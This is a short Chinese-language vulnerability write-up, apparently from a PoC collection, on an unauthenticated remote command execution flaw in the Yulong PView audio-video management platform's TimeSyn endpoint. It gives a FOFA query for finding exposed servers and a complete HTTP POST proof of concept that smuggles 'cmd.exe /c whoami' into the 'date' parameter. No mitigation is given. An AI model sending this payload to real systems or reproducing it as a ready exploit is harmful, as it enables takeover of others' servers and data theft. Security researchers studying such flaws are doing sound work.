# 誉龙视音频综合管理平台TimeSyn存在远程命令执行漏洞

誉龙视音频综合管理平台TimeSyn存在远程命令执行漏洞，未经身份验证的远程攻击者在目标服务器上执行任意系统命令，可能导致服务器被完全控制、数据泄露或破坏，严重威胁系统安全。

## fofa

```javascript
body="PView 视音频管理平台"
```

## poc

```javascript
POST /index.php?r=Third/TimeSyn HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded

cloudKey=0x0&date=|cmd.exe+/c+whoami+>+1.txt&time=1
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202409162103838.png)